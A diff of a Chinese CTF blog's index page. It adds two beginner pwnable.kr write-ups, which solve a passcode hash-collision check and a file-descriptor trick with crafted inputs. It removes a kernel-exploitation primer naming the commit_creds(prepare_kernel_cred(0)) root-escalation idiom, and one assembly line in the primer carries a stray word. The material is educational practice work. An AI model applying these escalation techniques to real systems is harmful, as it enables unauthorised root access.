@@ -82,6 +82,163 @@
 
       <div class="outer">
         <section id="main">
+  <article id="post-pwnable-kr-col" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/CTF/PWN/wp/pwnable-kr/pwnable-kr-col/">pwnable.kr_col</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-15T07:57:24.000Z" itemprop="datePublished">2021年11月15日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/wp/">wp</a> > <a class="article-category-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a>
+  </div>
+
+      
+      
+<a href="/CTF/PWN/wp/pwnable-kr/pwnable-kr-col/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="col"><a href="#col" class="headerlink" title="col"></a>col</h1><p>hint</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<p>列出文件并打印<code>col.c</code>文件；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">col@pwnable:~$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-x---   5 root    col     4096 Oct 23  2016 .</span><br><span class="line">drwxr-xr-x 116 root    root    4096 Nov 11 14:52 ..</span><br><span class="line">d---------   2 root    root    4096 Jun 12  2014 .bash_history</span><br><span class="line">-r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col</span><br><span class="line">-rw-r--r--   1 root    root     555 Jun 12  2014 col.c</span><br><span class="line">-r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag</span><br><span class="line">dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi</span><br><span class="line">drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache</span><br><span class="line">col@pwnable:~$ cat col.c </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode = 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">	int* ip = (int*)p;</span><br><span class="line">	int i;</span><br><span class="line">	int res=0;</span><br><span class="line">	for(i=0; i&lt;5; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen(argv[1]) != 20)&#123;</span><br><span class="line">		printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(hashcode == check_password( argv[1] ))&#123;</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到当满足`hashcode == check_password( argvp[1] )时，即可拿shell；</p>
+<p>而<code>hashcode</code>已经写死为<code>0x21DD09EC</code>；</p>
+<p>要求我们输入的参数，加了5次后等于<code>0x21DD09EC</code>；</p>
+<p>只需要使用<code>0x01010101</code> * 4 + <code>0x1DD905E8</code>即可；</p>
+<p>使用Python来输入参数，即可拿到flag；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./col `python -c &quot;print(&#x27;\x01\x01\x01\x01&#x27;*4+&#x27;\xe8\x05\xd9\x1d&#x27;)&quot;`</span><br><span class="line">daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure>
+
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/7/index.html">https://www.jk404.cn/page/7/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
+  <article id="post-pwnable-kr-fd" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/CTF/PWN/wp/pwnable-kr/pwnable-kr-fd/">pwnable.kr_fd</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-15T07:53:07.000Z" itemprop="datePublished">2021年11月15日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/wp/">wp</a> > <a class="article-category-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a>
+  </div>
+
+      
+      
+<a href="/CTF/PWN/wp/pwnable-kr/pwnable-kr-fd/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>hint</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https://youtu.be/971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<p>连上去后，查看根目录以及.c文件；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ls -la</span><br><span class="line">total 40</span><br><span class="line">drwxr-x---   5 root   fd   4096 Oct 26  2016 .</span><br><span class="line">drwxr-xr-x 116 root   root 4096 Nov 11 14:52 ..</span><br><span class="line">d---------   2 root   root 4096 Jun 12  2014 .bash_history</span><br><span class="line">-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag</span><br><span class="line">-rw-------   1 root   root  128 Oct 26  2016 .gdb_history</span><br><span class="line">dr-xr-xr-x   2 root   root 4096 Dec 19  2016 .irssi</span><br><span class="line">drwxr-xr-x   2 root   root 4096 Oct 23  2016 .pwntools-cache</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ cat fd.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">	int len = 0;</span><br><span class="line">	len = read(fd, buf, 32);</span><br><span class="line">	if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">		printf(&quot;good job :)\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要输入参数，使得<code>read(fd, buf, 32)</code>读取”LETMEWIN”到buf上，需要使fd=0，即<code>fd=0x1234=4660</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+
+<p>即可得到flag；</p>
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/7/index.html">https://www.jk404.cn/page/7/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
   <article id="post-l3hctf2021-spn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     
@@ -1120,619 +1277,10 @@
 </article>
 
 
-  <article id="post-basic-knowledge" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/CTF/PWN/kernel-pwn/knowledge/basic-knowledge/">basic_knowledge</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-11-11T12:27:46.000Z" itemprop="datePublished">2021年11月11日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
-    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a> > <a class="article-category-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a>
-  </div>
-
-      
-      
-<a href="/CTF/PWN/kernel-pwn/knowledge/basic-knowledge/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h1><h2 id="Kernel-Basic"><a href="#Kernel-Basic" class="headerlink" title="Kernel Basic"></a>Kernel Basic</h2><p>kernel也是一个程序：</p>
-<ol>
-<li>用来管理软件发出的数据I/O要求；</li>
-<li>将要求转义为指令；</li>
-<li>交给CPU和计算机中其他组件处理；</li>
-</ol>
-<p>kernel 最主要的功能有两点：</p>
-<ol>
-<li>控制并与硬件进行交互</li>
-<li>提供 application 能运行的环境</li>
-</ol>
-<h3 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h3><p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</p>
-<p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p>
-<p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p>
-<p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p>
-<h3 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h3><p>可加载核心模块（内核模块）就像运行在内核空间的可执行程序，包括：</p>
-<ul>
-<li>驱动程序（Device drivers）<ul>
-<li>设备驱动</li>
-<li>文件系统驱动</li>
-<li>…</li>
-</ul>
-</li>
-<li>内核扩展模块（modules）</li>
-</ul>
-<p>LKMs的文件格式和用户态的可执行程序相同，Linux→ELF，Windows→exe/dll，macOS→MACH-O，因此可以用IDA等工具来分析内核模块；</p>
-<p>模块可以单独编译，但不能单独运行，运行时链接到内核中，作为内核的一部分在内核空间运行；</p>
-<p>大多数CTF中的kernel vulnerability也出现在LKM中；</p>
-<h3 id="command"><a href="#command" class="headerlink" title="command"></a>command</h3><p>insmod：将指定模块加载到内核中；</p>
-<p>rmmod：从内核中卸载指定模块；</p>
-<p>lsmod：列出已加载内核模块；</p>
-<p>modprobe：添加或删除模块，modprobe在加载模块时会查找依赖关系；</p>
-<h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>用户空间的程序请求操作系统内核高权限服务；</p>
-<h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h3><p>使用<code>man ioctl</code> 查看手册；</p>
-<p><code>ioctl</code>也是一个系统调用，用于与设备通信；</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>第一个参数<code>fd</code>为打开设备返回的文件描述符；</p>
-<p>第二个参数为用户程序对设备的控制命令；</p>
-<p>后面的参数为补充参数，与设备相关；</p>
-<p>使用<code>ioctl</code>使得用户程序可以直接访问设备驱动而不需要知道设备具体细节；</p>
-<h3 id="mode-changing"><a href="#mode-changing" class="headerlink" title="mode changing"></a>mode changing</h3><h4 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h4><p>当发生：</p>
-<ol>
-<li>系统调用；</li>
-<li>异常；</li>
-<li>外设产生中断；</li>
-</ol>
-<p>会发生用户态到内核态的切换。</p>
-<p>具体的过程为（x86-64）：</p>
-<ol>
-<li><p>通过<code>swapgs</code>（Swap GS Base Register）切换GS段寄存器，将GS寄存器值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用；详情见：<a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/swapgs">https://www.felixcloutier.com/x86/swapgs</a></p>
-</li>
-<li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</p>
-<blockquote>
-<p>用户栈与内核栈的交换</p>
-</blockquote>
-</li>
-<li><p>通过 push 保存各寄存器值，代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> /* 保存栈值，并设置内核栈 */</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure></li>
-<li><p>通过汇编指令判断是否为 <code>x32_abi</code>；</p>
-</li>
-<li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p>
-</li>
-</ol>
-<h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>退出时，流程如下：</p>
-<ol>
-<li>通过 <code>swapgs</code> 恢复 GS 值；</li>
-<li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）；</li>
-</ol>
-<h3 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h3><p> kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p>
-<p>结构体定义如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
-
-<h3 id="kernel-function"><a href="#kernel-function" class="headerlink" title="kernel function"></a>kernel function</h3><p>相比用户态库函数，内核态的函数有了一些变化</p>
-<ul>
-<li>printf() -&gt; printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li>
-<li>memcpy() -&gt;copy_from_user()/copy_to_user()<ul>
-<li>copy_from_user() 实现了将用户空间的数据传送到内核空间；</li>
-<li>copy_to_user() 实现了将内核空间的数据传送到用户空间；</li>
-</ul>
-</li>
-<li>malloc() -&gt; kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li>
-<li>free() -&gt; kfree()，同 kmalloc()</li>
-</ul>
-<p>另外要注意的是，kernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数：</p>
-<ul>
-<li><strong>int commit_creds(struct cred *new)</strong></li>
-<li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li>
-</ul>
-<p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>）</p>
-<h3 id="kallsyms"><a href="#kallsyms" class="headerlink" title="kallsyms"></a>kallsyms</h3><blockquote>
-<p>为了更方便的调试内核代码，开发者考虑：将内核代码中所有函数以及所有非栈变量的地址抽取出来，形成是一个简单的数据块(data blob:符号和地址对应)，并将此链接进 <code>vmlinux </code>中。完成这一地址抽取+数据快组织封装功能的相关子系统就称之为 kallsyms。</p>
-</blockquote>
-<p>kallsyms抽取了内核用到的所有函数地址(全局的、静态的)和非栈数据变量地址，生成一个数据块，作为只读数据链接进kernel image（vmlinux），相当于内核中存了一个System.map。</p>
-<p>反之，如果没有 kallsyms 的帮助，内核只能将十六进制的符号地址呈现给外界，因为它能理解的只有符号地址，并不能显示各种函数名等符号。</p>
-<p>因此，在<code>/proc/kallysyms</code>中，可以看到内核中的函数；</p>
-<p>第二列是标识，有的符号是大写的，有的是小写。大写的符号是全局的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b 符号在未初始化数据区（BSS）</span><br><span class="line">c 普通符号，是未初始化区域</span><br><span class="line">d 符号在初始化数据区</span><br><span class="line">g 符号针对小object，在初始化数据区</span><br><span class="line">i 非直接引用其他符号的符号</span><br><span class="line">n 调试符号</span><br><span class="line">r 符号在只读数据区</span><br><span class="line">s 符号针对小object，在未初始化数据区</span><br><span class="line">t 符号在代码段</span><br><span class="line">u 符号未定义</span><br></pre></td></tr></table></figure>
-
-<h3 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h3><p>关于<code>kptr_restrict</code>，在<code>Document/sysctl/kernel.txt</code>中有如下介绍：</p>
